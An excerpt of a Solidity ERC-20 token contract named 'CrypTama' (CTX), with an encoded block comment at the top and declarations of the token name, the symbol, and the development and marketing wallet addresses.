...
/**
iddOiF_tQ)+C\nrDJ+#[email protected]<,p%F*)[email protected]()$ARf.kF(HJ<AKYJkDBNG&@;]^h+E)CCF(K02ATKK`J=RhBJ<M*[email protected];0glD.*
iddP#BOu'(8K`4cF!+m6Ch\!5Ch4_uDg<Hs+Eq73FCeu*FDi:2AKYD(BOu4&/g*o-F<GXCD.Oi#@;Tm)@Wca+DImm1+DkP)
/g*K'F<G!7F*2G5EbK$)D]j7;D]iP.F_kS2F(K6"+EDCBFCf>4G%kc/@;0V#+Dbb-AKZ8:FWb:4H"h//+EqOABHV52AKYr7DI[?4iddRBidd48;djB^@;TE[
*/
...
contract CrypTama is Context, IERC20, Ownable {
 
    using SafeMath for uint256;
 
    string private constant _name = "CrypTama";//
    string private constant _symbol = "CTX";//
    ...
    address payable private _developmentAddress = payable(0x98ee69c74BEb375a003cdDF8742DCE0280982F3E);//
    address payable private _marketingAddress = payable(0x98ee69c74BEb375a003cdDF8742DCE0280982F3E);//
